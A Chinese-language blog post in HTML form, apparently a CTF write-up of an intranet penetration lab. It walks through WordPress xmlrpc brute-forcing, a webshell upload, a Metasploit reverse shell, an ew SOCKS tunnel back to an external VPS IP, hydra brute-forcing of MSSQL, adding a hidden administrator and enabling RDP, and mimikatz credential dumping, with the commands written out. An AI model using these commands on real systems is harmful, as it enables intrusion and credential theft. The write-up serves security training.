@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>CTF内网渗透题 :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content=" 记一次CTF内网渗透，据说是从护网复现过来的。
+这是第一个flag。。。 既然我们知道这是wordpress正常套路那我们通过wpscan扫描一下
+如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下 参考：Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them 通过文章发布的地方知道存在一个power_admin的用户 通过xmlrpc.php验证一下 不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。 在媒体库内直接上传冰蝎一句话后访问正常操作 之后通过冰蝎配合msf反弹shell 内网穿透我比较常用的手法是通过ew配合proxychains 如何通过EW做Socks5代理进行内网渗透 - 知乎 ew for linux下载地址：ew
+首先在公网的vps上通过ew监听1080和1024 ./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp; 之后通过msf把ew客户端上传到靶机上
+meterpreter &gt; upload /root/ew/ew_for_linux64 /tmp/ [*] uploading : /root/ew/ew_for_linux64 -&gt; /tmp/ [*] uploaded : /root/ew/ew_for_linux64 -&gt; /tmp//ew_for_linux64 meterpreter &gt; meterpreter &gt; shell Process 20657 created. Channel 0 created. cd /tmp chmod 777 ew_for_linux64 ./ew_for_linux64 -s rssocks -d 118.126.66.150 -e 1024 在配置一下本地kali的proxychains 编辑/etc/proxychains.conf,在最下面一行修改为公网vps的地址和端口 正确配置后就可愉快的探索内网了，如下图通过proxychains nmap -sT 192.168.1.2 -Pn扫描1.2主机的端口，这里我就不扫描内网了可以通过msf的模块扫描，我这里直接通过webshell尝试ping邻居的IP来获取主机（注意icmp协议是无法通过proxychains传递的）。 发现存在1433端口通过hydra爆破密码，我前面已经爆破过了所以知道密码是123456演示一下，hydra命令我就不解释了看下help文档就会了。 通过proxychains msfconsole使用use auxiliary/admin/mssql/mssql_exec模块执行命令 添加账户设置管理员，开启3389
+" />
+<meta name="keywords" content="ctf" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/posts/ctfneiwang/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="CTF内网渗透题">
+<meta property="og:description" content=" 记一次CTF内网渗透，据说是从护网复现过来的。
+这是第一个flag。。。 既然我们知道这是wordpress正常套路那我们通过wpscan扫描一下
+如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下 参考：Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them 通过文章发布的地方知道存在一个power_admin的用户 通过xmlrpc.php验证一下 不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。 在媒体库内直接上传冰蝎一句话后访问正常操作 之后通过冰蝎配合msf反弹shell 内网穿透我比较常用的手法是通过ew配合proxychains 如何通过EW做Socks5代理进行内网渗透 - 知乎 ew for linux下载地址：ew
+首先在公网的vps上通过ew监听1080和1024 ./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp; 之后通过msf把ew客户端上传到靶机上
+meterpreter &gt; upload /root/ew/ew_for_linux64 /tmp/ [*] uploading : /root/ew/ew_for_linux64 -&gt; /tmp/ [*] uploaded : /root/ew/ew_for_linux64 -&gt; /tmp//ew_for_linux64 meterpreter &gt; meterpreter &gt; shell Process 20657 created. Channel 0 created. cd /tmp chmod 777 ew_for_linux64 ./ew_for_linux64 -s rssocks -d 118.126.66.150 -e 1024 在配置一下本地kali的proxychains 编辑/etc/proxychains.conf,在最下面一行修改为公网vps的地址和端口 正确配置后就可愉快的探索内网了，如下图通过proxychains nmap -sT 192.168.1.2 -Pn扫描1.2主机的端口，这里我就不扫描内网了可以通过msf的模块扫描，我这里直接通过webshell尝试ping邻居的IP来获取主机（注意icmp协议是无法通过proxychains传递的）。 发现存在1433端口通过hydra爆破密码，我前面已经爆破过了所以知道密码是123456演示一下，hydra命令我就不解释了看下help文档就会了。 通过proxychains msfconsole使用use auxiliary/admin/mssql/mssql_exec模块执行命令 添加账户设置管理员，开启3389
+" />
+<meta property="og:url" content="https://vuln.top/posts/ctfneiwang/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+  
+  <meta property="og:image" content="https://vuln.top/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2020-10-15 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://vuln.top/posts/ctfneiwang/">CTF内网渗透题</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2020-10-15 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Ca1s1</span>
+    
+    
+      <span class="post-reading-time">:: 1 min read (113 words)</span>
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <blockquote>
+<p>记一次CTF内网渗透，据说是从护网复现过来的。</p>
+</blockquote>
+<p><code>这是第一个flag。。。</code>
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/XYVLCT.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/XYVLCT.png" alt="a.md.png"></a>
+既然我们知道这是wordpress正常套路那我们通过<code>wpscan</code>扫描一下</p>
+<hr>
+<p>如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下
+参考：<a href="https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them</a>
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/YygAkD.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/YygAkD.png" alt="QQ20191012000758.png"></a></p>
+<p>通过文章发布的地方知道存在一个power_admin的用户
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4jKvvY.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4jKvvY.png" alt="SWYT13G1LF0YTM8V3M9A.png"></a>
+通过<code>xmlrpc.php</code>验证一下
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/ZpUhR0.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/ZpUhR0.png" alt="HFT3U203JYN_0GXU0X7.md.png"></a>
+不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hwSKJa.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hwSKJa.png" alt="NC85I4XP14RYQZOMYHK.md.png"></a>
+在媒体库内直接上传冰蝎一句话后访问正常操作
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/olvWei.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/olvWei.png" alt="9219XMTIHPMKF937Y.png"></a>
+之后通过冰蝎配合msf反弹shell
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Tn6BvB.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Tn6BvB.png" alt="1E42VR__1LT_7UMYS6E.png"></a></p>
+<p>内网穿透我比较常用的手法是通过ew配合proxychains
+<a href="https://zhuanlan.zhihu.com/p/32822159">如何通过EW做Socks5代理进行内网渗透 - 知乎</a>
+ew for linux下载地址：<a href="http://118.126.66.150/ew_for_linux64">ew</a></p>
+<hr>
+<p>首先在公网的vps上通过ew监听1080和1024
+<code>./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp; </code>
+之后通过msf把ew客户端上传到靶机上</p>
+<pre tabindex="0"><code>meterpreter &gt; upload /root/ew/ew_for_linux64 /tmp/
+[*] uploading  : /root/ew/ew_for_linux64 -&gt; /tmp/
+[*] uploaded   : /root/ew/ew_for_linux64 -&gt; /tmp//ew_for_linux64
+meterpreter &gt; 
+meterpreter &gt; shell
+Process 20657 created.
+Channel 0 created.
+cd /tmp
+chmod 777 ew_for_linux64
+./ew_for_linux64 -s rssocks -d 118.126.66.150 -e 1024
+</code></pre><p>在配置一下本地kali的proxychains
+编辑<code>/etc/proxychains.conf</code>,在最下面一行修改为公网vps的地址和端口
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/T1FNkx.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/T1FNkx.png" alt="K5Y013PSU5M83UBVBXPV.png"></a>
+正确配置后就可愉快的探索内网了，如下图通过<code>proxychains nmap -sT 192.168.1.2 -Pn</code>扫描1.2主机的端口，这里我就不扫描内网了可以通过msf的模块扫描，我这里直接通过webshell尝试ping邻居的IP来获取主机（注意icmp协议是无法通过proxychains传递的）。
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/5wFub4.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/5wFub4.png" alt="3ZNZLFWSSM47GFEU2O.png"></a>
+发现存在1433端口通过hydra爆破密码，我前面已经爆破过了所以知道密码是123456演示一下，hydra命令我就不解释了看下help文档就会了。
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/GJuZ6d.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/GJuZ6d.png" alt="0W970XQWF9T7WQWXJGN2E.md.png"></a>
+通过<code>proxychains msfconsole</code>使用<code>use auxiliary/admin/mssql/mssql_exec</code>模块执行命令
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/KMudsD.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/KMudsD.png" alt="QQ20191012010458.png"></a>
+添加账户设置管理员，开启3389</p>
+<pre tabindex="0"><code>net user 1111 abc.123 /add
+net localgroup administrators 1111 /add
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+</code></pre><p><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hZFi47.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hZFi47.png" alt="NY5_FWI1V_B79CBEDMU.png"></a>
+现在可以通过rdesktop直接访问
+<a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Bb1WIQ.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Bb1WIQ.png" alt="HTE8Q1ILEEY59JQ0_V2.png"></a>
+上传神奇mimikz！！获取管理员密码</p>
+<pre tabindex="0"><code>privilege::debug
+sekurlsa::logonpasswords
+</code></pre><p><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/eb6d61.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/eb6d61.png" alt="BKJXCL2EW5SSLEMFR.png"></a></p>
+<p><a href="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3xtF0N.png"><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3xtF0N.png" alt="YWY4ZGBZMJEAMOVV7O.png"></a></p>
+<p>还有一台主机通过密码flag3{xxxx}账号administrator直接远程桌面连接即可</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h"></span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://vuln.top/posts/jeb_debug_encrypt/">
+                <span class="button__icon">←</span>
+                <span class="button__text">JEB_Debug_Encrypt</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://vuln.top/posts/2019shendun/">
+                <span class="button__text">2019神盾杯</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
